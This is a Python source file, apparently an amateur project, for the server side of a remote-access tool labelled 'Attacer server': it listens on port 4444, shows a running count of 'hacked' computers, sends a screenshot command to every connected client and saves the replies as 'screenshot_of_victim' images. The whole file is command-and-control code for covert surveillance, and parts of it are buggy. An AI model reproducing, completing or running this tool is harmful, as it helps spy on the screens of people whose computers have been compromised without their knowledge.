# from tkinter import *
import PySimpleGUI as sg
import socket
import threading
import subprocess
from queue import Queue
from datetime import datetime

messages_queue = Queue()

class GUI:
    window = None

    def __init__(self):
        layout = [[sg.Text("What's your name?")],
                  [sg.Text(size=(40,10), key='-TITLE-')],  # Part 2 - The Layout
                  [sg.Button('Take a screenshot')]]

        GUI.window = sg.Window('Attacer server', layout, finalize=True)
        GUI.window['-TITLE-'].update("You have hacked 0 computers")
        while True:
            event, values = GUI.window.read()

            if event == sg.WINDOW_CLOSED or event == 'Quit':
                break

        GUI.window.close()

    @staticmethod
    def update_hacked_num(x):
        GUI.window['-TITLE-'].update("You have hacked " + str(x) + " computers")

    def take_screenshot(self):
        messages_queue.put('screenshot')
        # self.server.takeScreenshot('screenshot')


class Server:

    def __init__(self):
        server_ip = socket.gethostbyname(socket.gethostname())
        # server_ip = '192.168.0.136'
        port = 4444

        address = (server_ip, port)

        self.clients = []  # list of all clients
        self.connected_clients = 0

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(address)

        print("Server is working on " + server_ip)
        server.listen()

        # thread for dealing with messages
        messages_thread = threading.Thread(target=self.messaes_handler)
        messages_thread.start()

        while True:
            # accept connection with client
            conn, addr = server.accept()
            conn.send("NAME".encode("utf-8"))
            self.clients.append(conn)
            self.connected_clients += 1

            GUI.update_hacked_num(self.connected_clients)

            # create new thread for that client
            thread = threading.Thread(target=self.handler,
                                      args=(conn, addr))
            thread.start()

    def handler(self, conn, addr):
        print(f"Connected to new client with address {addr}")

        while True:
            if self.is_socket_closed(conn):
                break
            message = conn.recv(1024)
            if message:
                now = datetime.now()
                f = open('screenshots/screenshot_of_victim_' + str(addr[0]) + '-' + str(addr[1]) + '_' + str(
                    now.strftime("%Y%m%d_%H-%M-%S")) + '.png', 'wb')
                while len(message) == 1024:
                    f.write(message)
                    message = conn.recv(1024)
                print("receiving finished")
                f.close()
        print(f"Client with address {addr} disconnected")
        self.connected_clients -= 1
        GUI.update_hacked_num(self.connected_clients)
        conn.close()

    def is_socket_closed(self,sock):
        try:
            # this will try to read bytes without blocking and also without removing them from buffer (peek only)
            data = sock.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
            if len(data) == 0:
                return True
        except BlockingIOError:
            return False  # socket is open and reading from it would block
        except ConnectionResetError:
            return True  # socket was closed for some other reason
        except Exception as e:
            return False
        return False

    def messaes_handler(self):
        for msg in iter(messages_queue.get, 'STOP'):
            self.send_message(msg)

    def send_message(self, message):
        for client in self.clients:
            client.send(str.encode(message))


# New thread for server
thread = threading.Thread(target=Server)
thread.start()
# s = Server()
g = GUI()
